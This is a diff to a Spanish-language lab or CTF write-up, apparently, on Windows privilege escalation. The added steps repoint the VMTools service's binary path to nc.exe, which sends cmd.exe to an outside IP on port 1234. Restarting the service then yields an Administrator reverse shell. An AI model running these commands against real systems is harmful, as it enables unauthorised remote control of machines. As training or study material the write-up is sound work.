@@ -126,8 +126,17 @@ upload nc.exe
 ```
 
 ```shell
-sc.exe config VMTools binPath="C:\tempnc.exe -e cmd.exe 10.10.15.165 1234"
+sc.exe config VMTools binPath="C:\temp\nc.exe -e cmd.exe 10.10.15.165 1234"
 ```
 
-Ahora tendremos que parar el servicio de `VMTools` para que se nos entable nuestra `Reverse Shell`ç
-``
+Ahora tendremos que parar el servicio de `VMTools` para que se nos entable nuestra `Reverse Shell`
+```shell
+sc.exe stop VMTools
+```
+
+Y luego la volvemos a arrancar, para que haga la llamada al `nc.exe`
+```shell
+sc.exe start VMTools
+```
+
+Obteniendo una shell como `Administrator`
